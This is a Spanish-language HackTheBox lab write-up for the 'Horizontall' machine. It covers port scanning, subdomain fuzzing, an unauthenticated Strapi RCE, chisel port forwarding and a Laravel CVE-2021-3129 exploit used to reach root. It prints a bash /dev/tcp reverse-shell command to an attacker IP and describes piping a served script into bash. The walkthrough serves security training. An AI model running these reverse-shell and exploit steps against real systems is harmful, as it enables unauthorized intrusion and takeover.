---
title: Horizontall Writeup  
author:
date: 11-03-2023
categories: [HackTheBox Linux, Machines Easy]
tags: [Writeup, Guías, HackTheBox,Linux, Strapi, Laravel,Port Forwarding]
pin: false
image:
  path: /assets/img/commons/Horizontall/Horizontall.png
  alt: Ambassador WriteUp
---

**10.10.11.183 Horizontall (easy machine)** el día de hoy vengo a traer otra máquina Linux con dificultad easy ,  aprovechandonos de la versión de strapi para tener un RCE y con una escalada de privilegios con un port forwarding con chisel 
 
## Information Ghatering / ScanPorts
- Comenzaremos haciendo una fase de descubirmiento con nmap 

```console
$ nmap -p-  -sS -vvv  --min-rate 2000 -n -Pn 10.10.11.105 -oG allPorts 
```
-p-  -> escanearemos todos los rangos de puertos (65535)

-sS -> análisis utilizando TCP SYN Este tipo de escaneo, está basado en la velocidad de escaneo, de ahí la versatilidad que mencionamos anteriormente, ya que permite escanear miles de puertos por segundo en una red que se encuentre de>

-vvv -> verbose para que mediante vayas descubriendo puertos se reporten en la terminal

--min-rate 2000 -> paquetes enviados no mas lentos que 2000 paquetes por segundo, envío de paquetes super rápido

-n -> que no aplique resoluci+on de DNS para que no tarde el escaneo

-Pn -> ni que me detecte el descburimiento de hosts

```console
$ nmap -p- --open -sS --min-rate 2000 -vvv -n -Pn 10.10.11.105 -oG allPorts 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-11 14:08 CST
Initiating SYN Stealth Scan at 14:08
Scanning 10.10.11.105 [65535 ports]
Discovered open port 22/tcp on 10.10.11.105
Discovered open port 80/tcp on 10.10.11.105
Completed SYN Stealth Scan at 14:08, 21.11s elapsed (65535 total ports)
Nmap scan report for 10.10.11.105
Host is up, received user-set (0.068s latency).
Scanned at 2023-03-11 14:08:19 CST for 21s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 21.20 seconds
           Raw packets sent: 65570 (2.885MB) | Rcvd: 65582 (2.625MB)
```
No hay mucha información asi que lanzaré otro escaneo con scripts para detectar mas a fondo servicio y versiones 

-sCV -> escaneo lanzando scripts que detecten servicios y versiones

-p -> especeficando los puertos a escanear

-oN y todo nuestro output lo guardamos en una captura formato nmap con el nombre de targeted

```console
$ nmap -sCV -p22,80 10.10.11.105 -oN targeted                               
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-11 14:10 CST
Nmap scan report for api-prod.horizontall.htb (10.10.11.105)
Host is up (0.068s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee774143d482bd3e6e6e50cdff6b0dd5 (RSA)
|   256 3ad589d5da9559d9df016837cad510b0 (ECDSA)
|_  256 4a0004b49d29e7af37161b4f802d9894 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Welcome to your API
|_http-cors: HEAD GET POST PUT DELETE OPTIONS PATCH
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.54 seconds
```
si vemos con whatweb las tecnologias que emplea vemos un redireccionamiento a horizontall.htb por lo tanto para aplicar la resolución de DNS y me resuelva al dominio lo agregare al /etc/hosts 

![](/assets/img/commons/Horizontall/terminal1.png)

![](/assets/img/commons/Horizontall/terminal2.png)

Una vez agregado al /etc/hosts miraremos el sitio web 

![](/assets/img/commons/Horizontall/web.png)

Mirando un rato sinceramente no hay nada interesante por lo tanto comenzaré a fuzzear por subdominios para ver si encontramos algo 

## Fuzzing Discovery subdomain and directorys

```console
$ wfuzz -c -t 100 --hc=404 --hh=901 --hw=13 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.horizontall.htb" -u http://horizontall.htb/
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://horizontall.htb/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                   
=====================================================================

000047093:   200        19 L     33 W       413 Ch      "api-prod"
```
-t 100 -> un total de 100 hilos para ejecutar tareas en paralelo 

--hc=404 -> ocultamos el codigo de estado 404 error

--hh=901 -> ocultamos el número de caracteres que nos pueda arrojar 

--hw=13 -> ocultamos el numero de palabras que pueda proporcionar 

encontramos un api-prod muy interesante, procederé a agregarlo al /etc/hosts para poder ver el subdominio 

![](/assets/img/commons/Horizontall/terminal3.png)

![](/assets/img/commons/Horizontall/web1.png)

esto ya me causa mucho interés por lo tanto ahora fuzzeare directorios pero ahora sobre api-prod ,para ver que otra cosa me puedo encontrar **http://api-prod.horizontall.htb/FUZZ**

```console
$ wfuzz -c -t 100 --hc=404  --hh=413 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://api-prod.horizontall.htb/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://api-prod.horizontall.htb/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                   
=====================================================================

000000137:   200        0 L      21 W       507 Ch      "reviews"                                                                                                                                                                 
000000202:   403        0 L      1 W        60 Ch       "users"                                                                                                                                                                   
000000259:   200        16 L     101 W      854 Ch      "admin" 
```
vemos un reviews, users y admin, me meteré a admin para ver su contenido 

![](/assets/img/commons/Horizontall/web2.png)

vemos un redireccionamiento a /auth/login donde emplea strapi ,eso es algo raro puede ver mas directorios después de admin 

> Strapi es un CMS de código abierto basado en Node.js que te permite crear una API y gestionar su contenido

lo que haŕe para buscar mas contenido es fuzzear ahora en admin 

```console
$ wfuzz -c -t 100 --hc=404  --hh=854 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://api-prod.horizontall.htb/admin/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://api-prod.horizontall.htb/admin/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                   
=====================================================================

000000519:   403        0 L      1 W        60 Ch       "plugins"                                                                                                                                                                 
000000664:   200        0 L      1 W        90 Ch       "layout"                                                                                                                                                                  
000007404:   200        0 L      1 W        144 Ch      "init"                                                                                                                                                                    
000010316:   403        0 L      1 W        60 Ch       "Plugins"
```
checando en init vemos un leak de información importante 

![](/assets/img/commons/Horizontall/terminal4.png)

## Strapi Exploitation

**strapiVersion	"3.0.0-beta.17.4"** buscaremos un exploit relacionado con esa versión de strapi 

![](/assets/img/commons/Horizontall/terminal5.png)

tenemos un RCE que no hará falta estar autenticados simplemente lanzando el exploit deberiamos de tener una ejecución remota de comandos, pero analizando bien el exploit estaremos dentro de un RCE a ciegas 

![](/assets/img/commons/Horizontall/terminal6.png)

si checamos el exploit detalladamente al principio comparara la versión que ejecutar strapi en el directorio que descubrimos /admin/init posteriormente si coincide cambiara la contraseña de autenticación aprovechandose de una vulnerabilidad basada en un jason web token donde seguidamente enviará una nueva petición con los nuevos datos a /admin/plugins/install para entablará una conexión por el puerto 1337
Vamos a lanzar el exploit :)

![](/assets/img/commons/Horizontall/terminal7.png)

tenemos ya acceso pero el problema que no estamos en una shell directamente para ejecutar comandos, por lo tanto me enviaré una reverse shell por el puerto 443 

```shell
bash -c 'bash -i >& /dev/tcp/10.10.14.9/443 0>&1'
```

![](/assets/img/commons/Horizontall/terminal8.png)

de el lado derecho observamos que ya estamos como strapi en la máquina victima solo hacemos tratamiento de la tty y tenemos la primera flag 

![](/assets/img/commons/Horizontall/terminal9.png)

## Privilege Escalation - Post Exploitation 
si buscamos por servicios que esten corriendo en la máquina victima o sea su porpio localhost vemos dos puertos internos que me dan curiosidad , normalmente estos servicios se ejecutan como root , asi que me los voy a traer haciendo un reenvío de puertos con chisel 

![](/assets/img/commons/Horizontall/terminal10.png)

## Port Forwarding with Chisel 

Port Forwarding (Reenvío de Puertos) configura los servicios públicos en la red, con netstat podemos ver que puertos tenemos abiertos en este caso quiero reenviar los puertos abiertos internos de la máquina victima a mi máquina atacante de Kali para esto haremos lo siguiente 

1. Descargamos [chisel](https://github.com/jpillora/chisel)
2. Establecemos un servidor con chisel en nuestra máquina atacante (Kali) donde pondremos el puerto 12345  a escucha y se conecte el cliente que es la máquina victima
3. Pasamos chisel a la máquina victima y establecemos el cliente  para mandar  la conexión a nuestro servidor con los puertos que encontramos en este caso el 1337 y 8000

![](/assets/img/commons/Horizontall/terminal11.png)

Estamos a espera del cliente , ahora pasaré el chisel a la máquina victima

![](/assets/img/commons/Horizontall/terminal12.png)

arriba vemos nuestro servidor que compartimos para pasar chisel y abajo la descarga, una vez descargado le damos permisos de ejecución.
Ahora solo falta establecer el cliente y los puertos a reenviar 

```console
$ strapi@horizontall:/tmp$ ./chisel client 10.10.14.9:12345 R:1337:127.0.0.1:1337 R:8000:127.0.0.1:8000
```
primero se establece el cliente a mi servidor que establecimos despues indico que quiero una conexión remota por al puerto 1337 de su localhost y ese puerto lo pasaré ahora al mio de mi máquina atacante y lo mismo hacemos con el puerto 8000

![](/assets/img/commons/Horizontall/terminal13.png)

y si nos fijamos en nuestro servidor ya tenemos el redireccionamiento de puertos

![](/assets/img/commons/Horizontall/terminal14.png)

si checamos con lsof vemos que tenemos esos puertos en mi máquina atacante ejecutandose como root

![](/assets/img/commons/Horizontall/terminal15.png)

haré un nuevo escaneo con nmap sobre mi localhost especificandole esos puertos (1337,8000) no hay mucho que ver y hacer en el 1337 pero en el 8000 vemos un servicio web 

![](/assets/img/commons/Horizontall/terminal16.png)

ingresamos a la web vemos otro leak de información 

![](/assets/img/commons/Horizontall/web3.png)

buscaremos un exploit relacionado a laravel 

> Laravel es un framework PHP gratis y de código abierto que brinda un conjunto de herramientas y recursos para crear aplicaciones modernas.

Buscando por github el exploit tenemos un POC de un rce -> [Exploit](https://github.com/nth347/CVE-2021-3129_exploit) 

![](/assets/img/commons/Horizontall/web4.png)

me clono el repositorio y simplemente hago los pasos para explotar la vulnerabilidad de laravel 
probaŕe el exploit con un simple id para ver si funciona y seguido tenemos RCE:D vemos que esta como root  

![](/assets/img/commons/Horizontall/terminal17.png)

Intentando varias formas de enviarme una revese shell no me funcionaba directamente con el comando asi que lo que opte fue crearme un documento llamado index.html donde contenga la reverse shell para compartir mi servidor y con un pipe interpretar el script con bash a la hora de hacer la consulta al index.html

```bash
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.14.9/443 0>&1'
```
1. Me pongo en escucha por el puerto 443 
2. Comparto mi servidor en python3 donde tengo el index.html 
3. Mando la petición con curl desde el exploit con bash para que me interprete la reverse shell

![](/assets/img/commons/Horizontall/terminal18.png)

tenemos un GET exitoso y en nuestro nc tenemos la shell, buscamos la flag de root y otra máquina completada:)!

![](/assets/img/commons/Horizontall/terminal19.png)


